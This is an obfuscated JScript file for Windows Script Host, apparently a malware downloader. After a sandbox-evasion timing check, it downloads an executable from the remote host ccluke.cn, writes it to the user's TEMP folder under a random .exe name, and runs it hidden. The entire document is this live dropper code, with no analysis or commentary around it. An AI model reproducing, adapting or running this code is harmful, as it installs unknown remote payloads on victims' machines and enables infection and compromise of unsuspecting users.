var _G0 = false;
var _QF = "CreateObject";
var _C = function _UJ() {return WScript[_QF]("WScript"+".Shell");}(), _E = 11;
var _ZH = "MSXML2.XMLHTTP";
var _ZF = 2123213;
var _D0 = 0;
function _V(_II){_C["Run"](_II, _D0, _D0);};
function _IC(){return _ZH + "";};
function _X(_VT, _Y0){_D0 = _D0 * 1; return _VT - _Y0;};
function _F0(){return _QF;};
/*@cc_on
  @if (@_win32 || @_win64)
    _G0 = true;
  @end
@*/
if (_G0)
{
var _U = "";
function _SQ(){return 22;};
var _JA = 0; var _T = 0;
function _Q()
{
var _UW = new this["Date"]();
var _GP = _UW["getUTCMilliseconds"]();
WScript["Sleep"](_SQ());
var _UW = new this["Date"]();
var _X0 = _UW["getUTCMilliseconds"]();
WScript["Sleep"](_SQ());
var _UW = new this["Date"]();
var _D1 = _UW["getUTCMilliseconds"]();
var _JA = "_Q1";
_JA = _X(_X0, _GP);
var _T = "_QG";
_T = _X(_D1, _X0);
_U = "open";
return _X(_JA, _T);
}
var _CS = false;
var _Y = false;
for (var _LR = _D0; _LR < _SQ() * 1; _LR++){if (_Q() != _D0){
_CS = true; 
_T = "31" + 11 * _JA + _T; 
_Y = true; 
break;
}}
function _S() {return ((_CS == true) && (_CS == _Y)) ? 1 : _D0;};
if (_CS && _S() && _Y){
function _D() {return _C["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0JYTIupzWm.ex" + "e";};
 _G1 = _IC();
 _NZ = WScript[_QF](_G1);
 var _VF = 1;
 while (_VF){
try {
	if (_VF == 1)
	{
		_NZ[_U]("GET", "http://ccluke.cn/b7eus", false);
		_NZ["send"]();
		_G = "Sleep";
	}
	WScript[_G](_SQ() + 120); 
	if (_NZ["readystate"] < 2 * 2) continue;
	_VF = _D0;
	function _F(_Q0) {var _PS = (1, 2, 3, 4, 5, _Q0); return _PS;};
	_VQ = WScript[_F0()]("ADODB.Stream");
	_G1 = _VQ;
	_G1[_U]();
	_G1["type"] = _F(1);
	_G1["write"](_NZ["ResponseBody"]);
	_VQ["position"] = _F(_D0);
	_G1["Save" + "ToFile"](_D(), 2);
	_VQ["cl"+"ose"]();
	_P = _D();
	_V(_P);
} catch(_Z){};
}
}
}

